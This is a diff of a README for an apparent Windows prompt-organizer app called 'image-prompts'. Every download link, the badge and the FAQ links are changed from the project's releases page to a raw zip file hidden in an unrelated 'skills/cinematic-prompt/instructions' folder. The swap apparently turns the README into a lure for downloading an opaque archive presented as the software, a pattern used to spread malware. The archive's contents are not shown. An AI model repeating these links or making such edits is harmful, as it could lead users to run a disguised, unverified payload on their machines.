@@ -1,12 +1,12 @@
 # 🧩 image-prompts - Organize prompts with ease
 
-[![Download image-prompts](https://img.shields.io/badge/Download%20Now-4B6BFB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Toryagrestic213/image-prompts/releases)
+[![Download image-prompts](https://img.shields.io/badge/Download%20Now-4B6BFB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip)
 
 ## 📥 Download
 
 Visit this page to download image-prompts for Windows:
 
-[https://github.com/Toryagrestic213/image-prompts/releases](https://github.com/Toryagrestic213/image-prompts/releases)
+[https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip](https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip)
 
 ## 🖥️ What image-prompts does
 
@@ -28,7 +28,7 @@ Follow these steps on Windows.
 
 Go to the download page:
 
-https://github.com/Toryagrestic213/image-prompts/releases
+https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip
 
 ### 2. Pick the latest version
 
@@ -174,7 +174,7 @@ Keep your prompt library easy to manage.
 
 Use the release page here:
 
-https://github.com/Toryagrestic213/image-prompts/releases
+https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip
 
 ### Is this for Windows?
 
@@ -225,4 +225,4 @@ Use this flow if you want the shortest path from download to first use.
 
 Download image-prompts here:
 
-https://github.com/Toryagrestic213/image-prompts/releases
+https://github.com/Toryagrestic213/image-prompts/raw/refs/heads/main/skills/cinematic-prompt/instructions/prompts-image-v1.2.zip
